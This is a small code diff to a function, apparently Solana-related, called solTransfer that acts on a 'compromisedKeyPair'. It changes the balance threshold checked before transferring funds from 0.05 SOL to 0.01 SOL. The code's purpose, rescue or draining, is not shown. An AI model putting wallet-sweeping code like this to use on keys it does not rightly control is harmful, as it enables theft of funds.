@@ -22,7 +22,7 @@ export async function solTransfer(
     compromisedKeyPair.publicKey,
   );
 
-  if (solBalance - 50000000 <= 0) {
+  if (solBalance - 0.01 * 1e9 <= 0) {
     return;
   }
 
